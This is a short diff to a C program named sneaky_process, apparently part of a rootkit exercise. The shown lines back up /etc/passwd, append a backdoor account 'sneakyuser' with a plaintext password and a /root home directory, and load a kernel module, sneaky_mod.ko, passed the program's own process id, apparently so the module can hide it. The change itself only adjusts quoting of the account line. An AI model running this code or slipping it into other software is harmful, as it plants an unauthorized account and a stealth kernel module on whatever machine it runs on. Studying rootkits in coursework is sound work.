@@ -11,7 +11,8 @@ int main(){
     printf("sneaky_process pid = %d\n", getpid());
     // step 2
     assert(system("cp /etc/passwd /tmp/")!=-1);
-    assert(system("echo sneakyuser:abc123:2000:2000:sneakyuser:/root:bash >> /etc/passwd")!=-1);
+    assert(system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd")!=-1);
+    
     // step 3
     char command[128];
     sprintf(command,"insmod sneaky_mod.ko process_id=%d",(int)getpid());
